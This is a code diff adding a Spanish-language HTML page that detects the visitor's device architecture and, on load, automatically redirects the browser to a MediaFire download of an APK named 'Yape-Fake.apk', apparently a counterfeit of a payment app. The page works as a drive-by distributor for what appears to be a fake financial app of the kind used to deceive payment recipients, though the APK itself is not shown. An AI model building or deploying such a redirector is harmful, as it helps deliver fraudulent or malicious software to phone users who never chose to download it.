@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirigiendo...</title>
+</head>
+<body>
+    <script>
+        // Función para detectar la arquitectura del dispositivo
+        function getArchitecture() {
+            const platform = navigator.platform.toLowerCase();
+            const userAgent = navigator.userAgent.toLowerCase();
+
+            if (platform.includes('arm64') || userAgent.includes('aarch64') || userAgent.includes('armv8')) {
+                return 'arm64-v8a';
+            } else if (platform.includes('arm') || userAgent.includes('armeabi') || userAgent.includes('armv7')) {
+                return 'armeabi-v7a';
+            } else if (platform.includes('x86_64') || userAgent.includes('x86_64') || userAgent.includes('amd64')) {
+                return 'x86_64';
+            }
+
+            if (userAgent.includes('android')) {
+                return 'armeabi-v7a'; // Suposición para Android
+            }
+
+            return 'default';
+        }
+
+        // Genera el enlace de descarga según la arquitectura
+        const architecture = getArchitecture();
+        const downloadLinks = {
+            'armeabi-v7a': 'https://www.mediafire.com/file/22ig66ez7dghh6t/Yape-Fake.apk/file',
+            'arm64-v8a': 'https://www.mediafire.com/file/cgjze5zwv34pgns/Yape-Fake.apk/file',
+            'x86_64': 'https://www.mediafire.com/file/k1ce65s5du5yl2p/Yape-Fake.apk/file',
+            'default': 'https://www.mediafire.com/folder/6u46rnx068uhe/Yape-Fake'
+        };
+
+        // Redirige al enlace adecuado
+        const apkLink = downloadLinks[architecture] || downloadLinks['default'];
+        window.location.href = apkLink;
+    </script>
+</body>
+</html>
